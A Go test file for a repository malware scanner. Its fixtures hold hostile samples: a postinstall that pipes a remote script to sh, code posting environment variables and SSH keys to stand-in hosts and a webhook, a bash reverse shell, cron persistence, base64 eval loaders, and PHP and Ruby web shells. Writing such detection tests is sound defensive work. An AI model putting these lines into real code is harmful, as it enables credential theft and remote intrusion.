package safety

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, dir string, files map[string]string) {
	t.Helper()
	for name, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func rulesFound(r Report) map[string]bool {
	out := map[string]bool{}
	for _, f := range r.Findings {
		out[f.Rule] = true
	}
	return out
}

func TestCleanRepository(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"main.go":      "package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"hello\") }\n",
		"README.md":    "# hello\n\nInstall: `curl -fsSL https://example.com/install.sh | sh`\n",
		"package.json": `{"name":"hello","scripts":{"test":"node test.js"},"dependencies":{"express":"^4.0.0"}}`,
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	// Only the weak docs note: install docs are common, so it costs little and
	// does not change the verdict.
	if r.Verdict != NoIndicators || r.Score < 95 || len(r.Findings) != 1 || r.Findings[0].Rule != "safety.pipe-to-shell-docs" {
		t.Errorf("clean repository: %s %d %+v", r.Verdict, r.Score, r.Findings)
	}
}

func TestMaliciousRepository(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"package.json": `{"name":"evil","scripts":{"postinstall":"node -e \"require('child_process').exec('curl https://x.example/p | sh')\""},` +
			`"dependencies":{"lodahs":"1.0.0","helper":"https://x.example/helper.tgz"}}`,
		"index.js": "const os = require('os');\nconst data = {host: os.hostname(), user: os.userInfo().username};\n" +
			"fetch('https://collector.example/c', {method: 'POST', body: JSON.stringify(process.env)});\n" +
			"const key = require('fs').readFileSync(os.homedir() + '/.ssh/id_rsa');\n" +
			"fetch('https://discord.com/api/webhooks/1/abc', {method:'POST', body: key});\n",
		"steal.py":         "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
		"run.sh":           "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n(crontab -l; echo '* * * * * /tmp/x') | crontab -\n",
		"setup.py":         "from setuptools import setup\nimport subprocess\nsetup(name='x', cmdclass={'install': Evil})\n",
		"requirements.txt": "reqeusts==2.0\nnumpy==1.0\n",
		"bin/tool":         "\x7fELF\x02\x01\x01\x00\x00\x00binary",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"safety.npm-install-script", "safety.typosquat", "safety.url-dependency", "safety.env-dump", "safety.identity-beacon",
		"safety.ssh-keys", "safety.chat-webhook", "safety.exec-decoded", "safety.reverse-shell", "safety.cron", "safety.setup-py-hook", "safety.executable"}
	found := rulesFound(r)
	for _, id := range want {
		if !found[id] {
			t.Errorf("missing %s", id)
		}
	}
	if r.Verdict != HighRisk || r.Score > 40 {
		t.Errorf("verdict %s score %d, want high risk at most 40", r.Verdict, r.Score)
	}
	if r.Findings[0].Severity != High {
		t.Errorf("findings should lead with high severity: %+v", r.Findings[0])
	}
}

func TestSecretsAreReportedWithoutValues(t *testing.T) {
	dir := t.TempDir()
	key := "AKIA" + strings.Repeat("Q", 16)
	write(t, dir, map[string]string{"config.py": "AWS_KEY = '" + key + "'\n"})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if !rulesFound(r)["sec.aws-key"] && len(r.Findings) == 0 {
		t.Fatalf("secret not found: %+v", r.Findings)
	}
	for _, f := range r.Findings {
		if strings.Contains(f.Evidence, key) {
			t.Errorf("a finding reproduces the secret: %+v", f)
		}
	}
}

func TestLimits(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{"a.js": "1", "b.js": "2", "c.js": "3", "node_modules/x/install.js": "bash -i >& /dev/tcp/1.2.3.4/1 0>&1"})
	r, err := Scan(context.Background(), dir, Limits{MaxFiles: 2, MaxFileSize: 1 << 20})
	if err != nil {
		t.Fatal(err)
	}
	if !r.Truncated || r.Files != 2 {
		t.Errorf("limit: files %d truncated %v", r.Files, r.Truncated)
	}
	if rulesFound(r)["safety.reverse-shell"] {
		t.Error("installed dependencies under node_modules should not be read")
	}
}

func TestValidateURL(t *testing.T) {
	hosts := []string{"github.com", "gitlab.com"}
	ok := map[string]string{
		"https://github.com/owner/repo":      "https://github.com/owner/repo",
		"https://GitHub.com/owner/repo.git/": "https://github.com/owner/repo.git",
	}
	for in, want := range ok {
		if got, err := ValidateURL(in, hosts); err != nil || got != want {
			t.Errorf("ValidateURL(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	for _, bad := range []string{"http://github.com/o/r", "https://user:pw@github.com/o/r", "https://github.com:8443/o/r", "https://github.com/o",
		"https://evil.example/o/r", "file:///etc", "ext::sh -c id", "https://github.com/o/r?x=1", "https://github.com/-o/r", "https://github.com/o/../r"} {
		if _, err := ValidateURL(bad, hosts); err == nil {
			t.Errorf("ValidateURL(%q) accepted", bad)
		}
	}
}

func TestEditDistanceAndTyposquat(t *testing.T) {
	if editDistance("lodahs", "lodash") != 1 || editDistance("reqeusts", "requests") != 1 || editDistance("expres", "express") != 1 || editDistance("react", "vue") != 5 {
		t.Error("edit distance")
	}
	if typosquat("expres", popularNPM) != "express" || typosquat("express", popularNPM) != "" || typosquat("vuex", popularNPM) != "" {
		t.Error("typosquat")
	}
}

func TestTestsAndCISoftened(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		".github/workflows/ci.yml": "run: curl -fsSL https://example.com/i.sh | sh\n",
		"tests/helpers.py":         "saved = dict(os.environ)\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Findings) != 2 {
		t.Fatalf("findings = %+v", r.Findings)
	}
	for _, f := range r.Findings {
		if f.Severity != Low || f.Confidence != Weak || !strings.HasPrefix(f.Why, "In ") {
			t.Errorf("not softened: %+v", f)
		}
	}
	if r.Score < 95 {
		t.Errorf("score %d; findings outside runtime code should cost little", r.Score)
	}
}

func TestPHPAndRubyAttacks(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"shell.php":                         "<?php\nif (isset($_POST['c'])) { system($_POST['c']); }\n",
		"loader.php":                        "<?php @eval(base64_decode('ZWNobyAxOw==')); ?>\n",
		"old.php":                           "<?php echo preg_replace('/(.*)/e', 'strtoupper(\"\\\\1\")', $s);\n",
		"composer.json":                     `{"name":"x/y","scripts":{"post-install-cmd":["php -r \"copy('https://x.example/p.php','p.php');\""]}}`,
		"boot.rb":                           "require 'base64'\neval(Base64.decode64('cHV0cyAx'))\n",
		"app/controllers/run_controller.rb": "class RunController < ApplicationController\n  def create\n    system(params[:cmd])\n  end\nend\n",
		"Gemfile":                           "source 'http://rubygems.example'\ngem 'rails'\ngem 'helper', git: 'https://x.example/helper.git'\n",
		"evil.gemspec":                      "Gem::Specification.new do |s|\n  s.name = 'evil'\n  s.extensions = ['ext/extconf.rb']\nend\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	found := rulesFound(r)
	for _, id := range []string{"safety.php-request-exec", "safety.php-eval-decoded", "safety.php-preg-eval", "safety.composer-install-script",
		"safety.ruby-eval-fetched", "safety.ruby-params-exec", "safety.gem-insecure-source", "safety.url-dependency", "safety.gem-native-extension"} {
		if !found[id] {
			t.Errorf("missing %s", id)
		}
	}
	if r.Verdict != HighRisk {
		t.Errorf("verdict %s, want high risk", r.Verdict)
	}
}

// A standard Laravel or Rails project raises nothing worth a review: their own
// Composer scripts are a note, and ordinary code is not a web shell.
func TestCleanPHPAndRubyProjects(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"composer.json": `{"name":"laravel/laravel","scripts":{` +
			`"post-autoload-dump":["Illuminate\\Foundation\\ComposerScripts::postAutoloadDump","@php artisan package:discover --ansi"],` +
			`"post-update-cmd":["@php artisan vendor:publish --tag=laravel-assets --ansi --force"],` +
			`"post-root-package-install":["@php -r \"file_exists('.env') || copy('.env.example', '.env');\""]}}`,
		"app/Http/Controllers/PostController.php": "<?php\n\nnamespace App\\Http\\Controllers;\n\nclass PostController extends Controller\n{\n" +
			"    public function show(string $id)\n    {\n        return view('post', ['post' => Post::findOrFail($id), 'q' => $_GET['q'] ?? '']);\n    }\n}\n",
		"Gemfile":               "source 'https://rubygems.org'\n\ngem 'rails', '~> 8.0'\ngem 'pg'\n",
		"app/models/post.rb":    "class Post < ApplicationRecord\n  validates :title, presence: true\n  def summary = body.truncate(80)\nend\n",
		"lib/tasks/report.rake": "task report: :environment do\n  system('bin/rails', 'stats')\nend\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if r.Verdict != NoIndicators {
		t.Errorf("clean projects: %s %+v", r.Verdict, r.Findings)
	}
}
